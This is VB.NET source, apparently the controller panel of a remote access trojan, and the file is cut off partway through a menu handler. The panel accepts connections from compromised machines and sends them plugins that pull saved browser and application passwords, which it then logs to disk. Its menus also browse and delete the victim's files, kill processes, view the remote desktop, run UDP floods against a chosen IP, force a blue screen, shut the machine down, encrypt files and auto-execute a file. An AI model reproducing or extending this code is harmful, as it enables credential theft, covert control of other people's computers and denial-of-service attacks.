Imports System.ComponentModel
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Media
Imports System.Runtime.InteropServices
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic.Devices
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class Form1
    <DllImport("ntdll.dll")>
    Public Shared Function NtTerminateProcess(ByVal hfandle As IntPtr, ByVal ErrorStatus As Integer) As UInteger
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
        'PL.MainCL.ST()
    End Sub
    Protected Overrides Sub WndProc(ByRef m As Message)

        Select Case m.Msg > 0
            Case m.Msg = &H10
                Dim n As Process = Process.GetCurrentProcess

                NtTerminateProcess(n.Handle, 0)
        End Select
        MyBase.WndProc(m)
    End Sub


    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.WindowState = FormWindowState.Maximized
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.WindowState = FormWindowState.Normal
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        '    Log_Form.Show()
        Timer2.Start()
        MKWFGA.Animations.Animation(Me.Handle, 1000, MKWFGA.Animations.AnimtedFlags.Blend)

    End Sub
    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        ABTForm.Show()
    End Sub

    Private Sub UcBtnExt2_BtnClick_1(sender As Object, e As EventArgs) Handles UcBtnExt2.BtnClick
        ABTForm.Show()
    End Sub











    Private serve As TcpListener

    Public Shared CliSt As List(Of TcpClient)



#Region "Viewer OLD"


    Public RDPViewer As TcpListener

    Public Sub GetRDVClient()

        While True

            Dim op As TcpClient = RDPViewer.AcceptTcpClient

            Task.Run(Sub() RD(op.GetStream(), op.Client.RemoteEndPoint.ToString))



        End While
    End Sub

    Public Sub RD(ByVal lp As NetworkStream, ByVal id As String)
        Dim foorm As New RViewerForm
        foorm.Label4.Text = AeroListView1.SelectedItems(0).Text
        foorm.Text = AeroListView1.SelectedItems(0).Text

        Dim h As New Thread(Sub() Application.Run(foorm))

        h.Start()

        Dim bf As New BinaryFormatter

        Try

            While True

                Dim ui As Image = bf.Deserialize(lp)
                '"|R|"

                ' Dim Buffer(1024 * 500) As Byte
                '  Dim lu As Integer = lp.Read(Buffer, 0, Buffer.Length)

                'If lu > 0 Then


                'Dim Message As String = Encoding.Default.GetString(Buffer, 0, lu)

                '  Dim o = Message.Replace("|R|", "")

                '  Dim IM As Byte() = Encoding.Default.GetBytes(o)

                '  Dim MM = New IO.MemoryStream(IM)



                foorm.PictureBox1.Image = ui

                    '    End If




                    GC.Collect()
                GC.WaitForPendingFinalizers()

            End While


        Catch ex As Exception
            Exit Sub
            h.Abort()

        End Try
    End Sub
#End Region

    Private Sub UcBtnExt1_BtnClick(sender As Object, e As EventArgs) Handles UcBtnExt1.BtnClick

        If UcBtnExt1.BtnText = "Listen !" Then

            serve = New TcpListener(IPAddress.Any, NumericUpDown1.Value)
            CliSt = New List(Of TcpClient)


            serve.Start()

            Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()


            Task.Factory.StartNew(Sub() AcceptAndRead(Context), CancellationToken.None, TaskCreationOptions.LongRunning)

            '   o.Start()

            RDPViewer = New TcpListener(IPAddress.Any, NumericUpDown2.Value)

            RDPViewer.Start()



            Task.Run(Sub() GetRDVClient())


            '  Timer1.Start()

            UcBtnExt1.BtnText = "Started !"





            '


        Else



            CliSt.Clear()
            serve.Stop()


            AeroListView1.Items.Clear()
            CliSt.Clear()
            RDPViewer.Stop()
            UcBtnExt1.BtnText = "Listen !"


        End If

    End Sub



    Public Sub AUTOPLG(ByVal TcpCli As TcpClient)
        Thread.Sleep(1500)

        If Auto_RECOV.Checked = True Then
            Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|ENDING|"
            Dim B As Byte() = Encoding.Default.GetBytes(o)
            Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))

        End If
        Thread.Sleep(1000)


        If AUTO_CHK_FILE.Checked Then

            Dim o As String = PL_IJCT & "|SP1|" & "" & "|SP2|" & "|EXE|" & "|SP2|" & FILETOEXEC & "|ENDING|"
            Dim B As Byte() = Encoding.Default.GetBytes(o)
            Task.Run(Sub() TcpCli.GetStream.WriteAsync(B, 0, B.Length))
        End If



    End Sub
    Public Async Sub AcceptAndRead(ByVal Context As TaskScheduler)

        Try
            While (True)
                Dim TcpCLI As TcpClient = serve.AcceptTcpClient


                CliSt.Add(TcpCLI)

                Dim S As Stream = My.Resources.me_too



                Dim snd As System.Media.SoundPlayer = New System.Media.SoundPlayer(S)
                snd.Play()


                Task.Run(Sub() SenderHelper.SenderHelper(CliSt, TcpCLI.Client.RemoteEndPoint.ToString, "|GETID|"))

                Dim DATA As New StringBuilder


                Task.Run(Sub() CheckClient(TcpCLI))



                Task.Run(Sub() RD(TcpCLI, Context, TcpCLI.Client.RemoteEndPoint.ToString, DATA))




                Dim h As New Thread(Sub() AUTOPLG(TcpCLI))

                h.Start()



                '  If Auto_RECOV.Checked = True Then

                '   Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|ENDING|"

                '    Dim B As Byte() = Encoding.Default.GetBytes(o)
                '  Dim oa As New Thread(Sub() LaunchAtConnect(TcpCLI.GetStream, B))
                '  RaiseEvent AUTO_PL(TcpCLI)
                '   oa.Start()
                '  Task.Run(Sub() TcpCLI.GetStream.WriteAsync(B, 0, B.Length))

                '   End If












                ' Dim ReadData As New Thread(Sub() RD(TcpCLI, Context, TcpCLI.Client.RemoteEndPoint.ToString, DATA))
                ' ReadData.Start()



            End While
        Catch ex As Exception
            Exit Sub
        End Try
    End Sub


#Region "Client Checker"
    Public Shared TestBytes As Byte() = Encoding.Default.GetBytes("")
    Public Sub CheckClient(ByVal k As TcpClient)
        While True
            Try
                k.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length)
            Catch ex As Exception
                For Each az As ListViewItem In AeroListView1.Items
                    If az.Text = k.Client.RemoteEndPoint.ToString Then
                        AeroListView1.Items.Remove(az)
                        CliSt.Remove(k)
                        Exit Sub
                    End If
                Next

            End Try

            Thread.Sleep(1000)
        End While
    End Sub
#End Region
    Private Async Sub RD(ByVal stream As TcpClient, ByVal context As TaskScheduler, ByVal id As String, ByVal l As StringBuilder)
        ''

        Dim foorm As New RViewerForm
        Dim VT As New Thread(Sub() Application.Run(foorm))
        Dim FM1 As New FileManager_Form
        Dim TASK1 As New Tasks_Form

        Dim INFO1 As New Info_Form
        Dim StringHelper As New StringBuilder
        While True
            Try



                '  Dim Buffer(500 * 4096) As Byte
                Dim Buffer(5000 * 4096) As Byte
                Dim lu As Integer = stream.GetStream.Read(Buffer, 0, Buffer.Length)

                If lu > 0 Then
                    Try
                        Dim Message As String = Encoding.Default.GetString(Buffer, 0, lu)








                        If Message.EndsWith("|IDDEND|") Then


                            Try

                                ' Dim n As String = Message.Replace("|IDDEND|", "")



                                Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)



                                Dim rhejk As String() = Split(j.Replace("|IDDEND|", ""), "|IDD|")
                                Countries.GetFlags(id, ImageList1, AeroListView1, rhejk)

                                'l.Clear()
                            Catch ex As Exception

                            End Try
                            '  l.Clear()





                        ElseIf Message.EndsWith("|GotThatNice|") Then

                            Dim a As New PassRecov_Form

                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)

                            Dim k As String() = Split(j, "|GotThatNice|")

                            l.Clear()


                            Dim k2 As String() = Split(k(0), Environment.NewLine)


                            Task.Run(Sub() SetPasswords(k2, id, a, k))












                        ElseIf Message.EndsWith("|VOL|") Then


                            FM1 = New FileManager_Form


                            '  Dim p As String = Message.Replace("|VOL|", "")


                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                            l.Clear()


                            Dim o As String() = Split(j.Replace("|VOL|", ""), Environment.NewLine)

                            For i = 0 To o.Length - 2

                                FM1.ComboBox1.Items.Add(o(i))

                            Next
                            FM1.Label4.Text = id
                            FM1.ComboBox1.Text = o(0)
                            FM1.Label1.Text = o(0)


                            AddHandler FM1.ComboBox1.SelectedIndexChanged, Sub() ComBoBoxHandler(FM1.ComboBox1, FM1)
                            Dim aj As New Thread(Sub() Application.Run(FM1))
                            aj.Start()






                        ElseIf Message.Contains("/\ENDFM/\") Then



                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                            Dim az As String() = Split(j, "|FILES|")
                            l.Clear()
                            '  IO.File.WriteAllText("Test.txt", az(1))

                            Task.Run(Sub() SetFM(az, FM1))


                        ElseIf Message.EndsWith("|ENDW|") Then
                            ''||       TEST ZONE       ||
                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                            Dim h As String = j.Replace("|ENDW|", "")

                            l.Clear()

                            Dim aze As New Thread(Sub() B64DW(h))
                            '   Task.Run(Sub() B64DW(h))
                            aze.Start()


                        ElseIf Message.EndsWith("|DELTRUE|") Then

                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)

                            Dim b As String = j.Replace("|DELTRUE|", "")

                            l.Clear()
                            Task.Run(Sub() DeleteFile(b, FM1))

                        ElseIf Message.EndsWith("|DELFALSE|") Then


                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                            Dim b As String = j.Replace("|DELFALSE|", "")


                            l.Clear()

                            Task.Run(Sub() DeleteFileFailed(b, FM1))

                        ElseIf Message.EndsWith("|OPENTRUE|") Then


                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)

                            Dim h As String = j.Replace("|OPENTRUE|", "")


                            l.Clear()

                            Task.Run(Sub() OpenFile(h))

                        ElseIf Message.EndsWith("|OPENFALSE|") Then


                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)

                            Dim h As String = j.Replace("|OPENFALSE|", "")
                            l.Clear()

                            Task.Run(Sub() OpenFileFailed(h))


                        ElseIf Message.EndsWith("|TASKF|") Then

                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                            TASK1 = New Tasks_Form
                            Dim h As String = j.Replace("|TASKF|", "")

                            l.Clear()

                            Dim h2 As String() = Split(h, Environment.NewLine)




                            TASK1.Label4.Text = id

                            Task.Run(Sub() SetTask(h2, TASK1))



                        ElseIf Message.EndsWith("|TASKF||OLD|") Then
                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                            Dim h As String = j.Replace("|TASKF||OLD|", "")

                            l.Clear()

                            Dim h2 As String() = Split(h, Environment.NewLine)




                            TASK1.Label4.Text = id

                            Task.Run(Sub() SetTask(h2, TASK1))


                            'RK


                        ElseIf Message.EndsWith("|RK|") Then


                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)

                            Dim h As String = j.Replace("|RK|", "")

                            l.Clear()

                            Dim h2 As String() = Split(h, "|/\|")





                            Task.Run(Sub() KT(h2, TASK1))










                        ElseIf Message.EndsWith("|INFOSYST|") Then

                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                            Dim o As String = j.Replace("|INFOSYST|", "")


                            ' l.Clear()
                            INFO1 = New Info_Form

                            INFO1.Label4.Text = id

                            Task.Run(Sub() SetInformation(INFO1, o))



                        ElseIf Message.StartsWith("|DESK|") Then




                            ' If VT.ThreadState = ThreadState.Running Then

                            'Try
                            'Dim o As String() = Split(Message, "|SP|")
                            ' Dim MM = New IO.MemoryStream(Encoding.Default.GetBytes(o(1)))



                            ' Dim iii As Image = bf.Deserialize(MM)

                            '      Task.Run(Sub() SetImage(foorm.PictureBox1, o(1)))
                            '               '    'foorm.PictureBox1.Image = Image.FromStream(MM)
                            'iii
                            'Image.FromStream(MM)

                            'MM.Dispose()
                            'GC.Collect()
                            '  GC.WaitForPendingFinalizers()
                            '    Catch ex As Exception
                            '   VT.Abort()

                            'End Try

                            'Else
                            '    foorm.Label4.Text = AeroListView1.SelectedItems(0).Text
                            '       foorm.Text = AeroListView1.SelectedItems(0).Text
                            '   VT.Start()
                            'End If

                            '  GC.Collect()
                            '    GC.WaitForPendingFinalizers()



                        ElseIf message.EndsWith("|STPDSK|") Then
                            foorm = New RViewerForm

                            VT = New Thread(Sub() Application.Run(foorm))

                        ElseIf Message.EndsWith("|ENDPROCINFO|") Then

                            Dim j As String = Encoding.UTF8.GetString(Buffer, 0, lu)

                            Dim Data As String = j.Replace("|ENDPROCINFO|", "")


                            ' l.Clear()

                            Task.Run(Sub() SetPROCINFO(Data))

                        ElseIf message.EndsWith("CRYPTO|") Then
                            Dim Chk As New Thread(Sub() EncDecChecker(Message))
                            Chk.Start()
                        End If



                    Catch ss As Exception
                    End Try





                End If



                ' Else
                '


                '   End If
            Catch ex As Exception
                Exit Sub
            End Try

        End While



    End Sub
    Public Sub SetImage(ByVal P As PictureBox, ByVal l As String)
        ' Dim pazeza As Byte() = Await Task.Run(Function() Encoding.Default.GetBytes(l))
        Dim pazeza As Byte() = Encoding.Default.GetBytes(l)
        Dim MM = New IO.MemoryStream(pazeza)


        ' Dim iii As Image = bf.Deserialize(MM)


        P.Image = Image.FromStream(MM)
    End Sub
    ''|| OLD CLIENT CHECKER ||

    ' Private Sub Timer1_Tick(sender As Object, e As EventArgs)
    'Dim uiok As Byte() = Encoding.Default.GetBytes("")
    'Dim klm As New TcpClient



    '  Try

    'For Each iaze As TcpClient In CliSt

    '           klm = iaze
    '          iaze.GetStream.Write(uiok, 0, uiok.Length)

    '  Next

    'Catch ex As Exception
    'For Each az As ListViewItem In AeroListView1.Items
    'If az.Text = klm.Client.RemoteEndPoint.ToString Then
    '                 AeroListView1.Items.Remove(az)
    '               CliSt.Remove(klm)

    '  End If
    'Next
    ' End Try


    '  End Sub

#Region "Tasks Manager Helper"
    Public Sub SetTask(ByVal az As String(), ByVal TASK1 As Tasks_Form)
        '|IC|


        Dim x = 0
        Dim t As Task = Task.Run(Sub() TASK1.ListView1.Items.Clear())



        t.Wait()

        ' Dim ImageList = New ImageList()

        '  ImageList.ColorDepth = ColorDepth.Depth32Bit


        '  ImageList.ImageSize = New Size(32, 32)

        ' TASK1.ListView1.LargeImageList = ImageList

        ' TASK1.ListView1.StateImageList = ImageList

        For i = 0 To az.Length - 2
            '    TASK1.ListView1.Items.Add(az(i))

            '   Dim h As String() = Split(az(i), "|IC|")
            '  Try
            'Dim o As Bitmap = BytesToImage(Convert.FromBase64String(h(1)))




            'ImageList.Images.Add(x, o)
            '  Catch ex As Exception

            ' End Try



            Dim listViewItem = TASK1.ListView1.Items.Add(az(i))
            '   listViewItem.Tag = ""
            ' listViewItem.ImageKey = x

            ' x += 1
        Next

        TASK1.ListView1.Sorting = SortOrder.Ascending
        TASK1.ListView1.Sort()

        Dim Thread_Form As New Thread(Sub() Application.Run(TASK1))
        Thread_Form.Start()




    End Sub

    Public Sub KT(ByVal az As String(), ByVal TASK1 As Tasks_Form)
        Dim bConv As Integer

        If Integer.TryParse(az(0), bConv) = True Or az(0) = "False" Then

            MessageBox.Show("Something went wrong on the killing task for : " & az(1))
        Else

            Try

                For Each u As ListViewItem In TASK1.ListView1.Items
                    If u.Text = az(1) Then
                        TASK1.ListView1.Items.Remove(u)
                    End If

                Next
            Catch ex As Exception

            End Try

        End If
    End Sub


    Public Async Sub SetPROCINFO(ByVal yuiuyj As String)
        Dim PF As New ProcInfo_Form


        Dim nhgopl As String() = Split(yuiuyj, "|/\|")

        PF.RichTextBox1.Text = nhgopl(0)



        PF.RichTextBox2.Text = nhgopl(1)



        PF.RichTextBox3.Text = nhgopl(2)


        PF.RichTextBox4.Text = nhgopl(3)

        PF.RichTextBox5.Text = nhgopl(4)


        PF.RichTextBox6.Text = nhgopl(5)


        PF.RichTextBox7.Text = nhgopl(6)


        PF.Label1.Text = nhgopl(7)

        Application.Run(PF)

    End Sub
#End Region

#Region "File Manager Helper"

    Public Async Sub B64DW(ByVal K As String)
        Dim o As String() = Split(K, "|DW|")

        Dim h As New Thread(Sub() GetFile(o(0), o(1)))
        h.Start()
    End Sub
    Public Async Sub GetFile(ByVal B64 As String, ByVal Name As String)
        MessageBox.Show("Data of file : " & Name & "have been downloaded ! Now they will be written !")
        Dim h As Byte() = Await Task.Run(Function() Convert.FromBase64String(B64))

        IO.File.WriteAllBytes(Name, h)


        GC.Collect()
        GC.WaitForPendingFinalizers()
    End Sub
    Public Async Sub ComBoBoxHandler(ByVal l As ComboBox, ByVal P As FileManager_Form)

        Dim o As String = PL_FM & "|SP1|" & "" & "|SP2|" & "|NO|" & "|SP2|" & l.Text & "|ENDING|"

        P.Label1.Text = l.Text

        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, P.Label4.Text, o))

    End Sub



    Public Sub SetFM(ByVal az As String(), ByVal FM1 As FileManager_Form)

        Dim t As Task = Task.Run(Sub() FM1.ListView1.Clear())



        t.Wait()
        Dim ImageList = New ImageList()
        ImageList.ColorDepth = ColorDepth.Depth32Bit


        ImageList.ImageSize = New Size(32, 32)

        FM1.ListView1.LargeImageList = ImageList

        Dim Files As String() = Split(az(0), vbCrLf)


        Dim x As Integer = 0

        Dim Folders As String() = Split(az(1), vbCrLf)

        For i = 0 To Folders.Length - 2


            ImageList.Images.Add(x, My.Resources.folder)




            Dim listViewItem = FM1.ListView1.Items.Add(Folders(i))
            listViewItem.Tag = "FOLDER"
            listViewItem.ImageKey = x

        Next
        x += 1

        For Each u As String In Files


            Dim h As String() = Split(u, "|IC|")


            Dim o As Bitmap = BytesToImage(Convert.FromBase64String(h(1)))




            ImageList.Images.Add(x, o)


            Dim listViewItem = FM1.ListView1.Items.Add(h(0))
            listViewItem.Tag = "FILE"
            listViewItem.ImageKey = x
            x += 1

        Next
        ' FM1.ListView1.Sorting = SortOrder.Ascending
        '   FM1.ListView1.Sort()


    End Sub

    Public Function ImageToBytes(ByVal img As Image) As Byte()
        Using mStream As New MemoryStream()
            img.Save(mStream, img.RawFormat)
            Return mStream.ToArray()
        End Using
    End Function

    Public Function BytesToImage(ByVal Bytesss As Byte()) As Image
        Using mStream As New MemoryStream(Bytesss)
            Return Image.FromStream(mStream)
        End Using
    End Function
    Public Sub DeleteFileFailed(ByVal FileName As String, ByVal FM1 As FileManager_Form)
        MessageBox.Show("Could not delete file named : " & FileName)
    End Sub
    Public Sub DeleteFile(ByVal FileName As String, ByVal FM1 As FileManager_Form)
        For Each h As ListViewItem In FM1.ListView1.Items
            If h.Text = FileName Then
                h.Remove()
            End If
        Next
    End Sub

    Public Sub OpenFile(ByVal F As String)
        MessageBox.Show("The file at : " & F & " has been opened")
    End Sub
    Public Sub OpenFileFailed(ByVal F As String)
        MessageBox.Show("The file at : " & F & " couldn't be opened")
    End Sub
#End Region

#Region "Information Helper"
    Public Sub SetInformation(ByVal F As Info_Form, ByVal j As String)
        For Each h As String In Split(j, vbCrLf)
            F.ListView1.Items.Add(h)
        Next

        Dim Thread_Form As New Thread(Sub() Application.Run(F))
        Thread_Form.Start()
    End Sub

#End Region

#Region "PassWords Checker"
    Public Sub SetPasswords(ByVal K2 As String(), ByVal ID As String, ByVal a As PassRecov_Form, ByVal k As String())


        Dim kn As ListViewItem


        For Each pk As String In K2

            If pk.StartsWith("Url") Then

                kn = New ListViewItem
                Dim Splitter As String = pk.Replace("Url:", "")
                kn.Text = Splitter
            End If



            If pk.StartsWith("Username") Then

                If kn.Text.Length > 0 Then

                    Dim Splitter As String = pk.Replace("Username:", "")
                    kn.SubItems.Add(Splitter)

                End If
            End If

            If pk.StartsWith("Password") Then


                If kn.Text.Length > 0 Then
                    Dim Splitter As String = pk.Replace("Password:", "")
                    kn.SubItems.Add(Splitter)
                End If
            End If


            If pk.StartsWith("Application") Then


                If kn.Text.Length > 0 Then
                    Dim Splitter As String = pk.Replace("Application:", "")
                    kn.SubItems.Add(Splitter)

                    a.ListView1.Items.Add(kn)

                End If


            End If


        Next
        a.Text = "Passwords from : " & ID
        a.Label1.Text = "Passwords from : " & ID

        If XuiCheckBox1.Checked Then
            Static J As New Random
            If IO.Directory.Exists(Application.StartupPath & "\Passwords") Then
                IO.Directory.CreateDirectory(Application.StartupPath & "\Passwords")
                IO.File.WriteAllText(Application.StartupPath & "\Passwords\Passwords_" & k(1).Replace(":", "_") & "_" & Date.Now.ToString.Replace(":", "_") & J.Next(0, 99) & ".txt", "Passwords From : " & ID & vbNewLine & vbNewLine & k(0) & vbNewLine)

            Else
                IO.Directory.CreateDirectory(Application.StartupPath & "\Passwords")
                IO.File.WriteAllText(Application.StartupPath & "\Passwords\Passwords_" & k(1).Replace(":", "_") & "_" & Date.Now.ToString.Replace(":", "_") & J.Next(0, 99) & ".txt", "Passwords From : " & ID & vbNewLine & vbNewLine & k(0) & vbNewLine)
            End If
        End If
        Application.Run(a)
    End Sub
#End Region

#Region "Encryption|Decrytion Checker"
    Public Sub EncDecChecker(ByVal M As String)
        If M.EndsWith("|DONE|CRYPTO|") Then

            Dim o As String = M.Replace("|DONE|CRYPTO|", "")

            MessageBox.Show("The file at : " & o & " has been encrypted or decrypted")

        ElseIf M.EndsWith("|FAIL|CRYPTO|") Then

            Dim o As String = M.Replace("|FAIL|CRYPTO|", "")


            MessageBox.Show("The file at : " & o & " has not been encrypted or decrypted")
        End If

    End Sub
#End Region


    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Label2.Text = DateTime.Now.TimeOfDay.Hours & ":" & DateTime.Now.TimeOfDay.Minutes & ":" & DateTime.Now.TimeOfDay.Seconds
    End Sub












#Region "Plugin Paths"
    Public S_PaTH As String = Application.StartupPath
    Public PL_Path As String() = {
       "\PLUGINS\PW.dll",
       "\PLUGINS\MISC.dll",
       "\PLUGINS\FM.dll",
       "\PLUGINS\DDOS.dll",
       "\PLUGINS\TASKS.dll",
       "\PLUGINS\HWDR.dll",
       "\PLUGINS\DSK.dll",
       "\PLUGINS\MSCT.dll",
       "\PLUGINS\VRSA.dll",
       "\PLUGINS\IJCT.dll",
       "\PLUGINS\ECF1.dll",
      "\PLUGINS\SCRO.dll"
    }


    Public PL_PW As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(0)))
    Public PL_MISC As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(1)))
    Public PL_FM As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(2)))
    Public PL_DDOS As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(3)))
    Public PL_TASKS As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(4)))
    Public PL_HWDR As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(5)))
    Public PL_DSK As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(6)))
    Public PL_MSCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(7)))
    Public PL_VRSA As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(8)))
    Public PL_IJCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(9)))
    Public PL_ECF1 As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(10)))
    Public PL_SRCO As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(11)))
    '
#End Region


#Region "ToolStrip Clients Sender"

    Private Async Sub GetPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetPasswordsToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then
            Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
        End If
    End Sub


    Private Async Sub MessageToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MessageToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim MSG As String = InputBox("Put a message : ")
            Dim o As String = PL_MISC & "|SP1|" & MSG & "|SP2|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub CloseDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseDeleteToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = "|CLOSETHISSHIT|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = "|CLOSEONLY|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

            AeroListView1.Items.Remove(AeroListView1.SelectedItems(0))
        End If
    End Sub

    Private Sub UcBtnExt2_BtnClick(sender As Object, e As EventArgs)
        BuilderClass.Build()
    End Sub

    Private Async Sub LogOutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogOutToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|LGT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|RBT|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub ShutDownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutDownToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|STD|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub BSODToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BSODToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|BSOD|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then



            Dim o As String = PL_FM & "|SP1|" & "" & "|SP2|" & "|YES|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub




    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        REMOTE_BUILDER.Show()
    End Sub

    Private Async Sub TestToolStripMenuItem_Click(sender As Object, e As EventArgs)
        'PL_DDOS
        If AeroListView1.SelectedItems.Count = 1 Then


            Dim o As String = PL_DDOS & "|SP1|" & "" & "|SP2|" & "127.0.0.1" & "|SP2|" & "808080" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub


    Private Async Sub UDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UDPToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then

            Dim j As String = InputBox("Set IP : ")
            Dim az As String = InputBox("Set Number of Requests : ")
            Dim o As String = PL_DDOS & "|SP1|" & "" & "|SP2|" & j & "|SP2|" & az & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub

    Private Async Sub TaskManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TaskManagerToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then



            Dim o As String = PL_TASKS & "|SP1|" & "" & "|SP2|" & "|GETTASKS|" & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub



    Private Async Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click

        If AeroListView1.SelectedItems.Count = 1 Then
            'ViewerFormHelper
            'ViewerFormHelper = New RViewerForm
            ' ViewerFormHelper.Text = AeroListView1.SelectedItems(0).Text
            'ViewerFormHelper.Show()




            Dim o As String = RViewerForm.PictureBox1.Width & "||"  & RViewerForm.PictureBox1.Height &  "||" & "|SRDV|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))

        End If
    End Sub



    Private Async Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then






            Dim o As String = "|TRDV|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))


        End If
    End Sub

    Private Async Sub ChangeWallPaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeWallPaperToolStripMenuItem.Click
        If AeroListView1.SelectedItems.Count = 1 Then
            Using FF As New OpenFileDialog
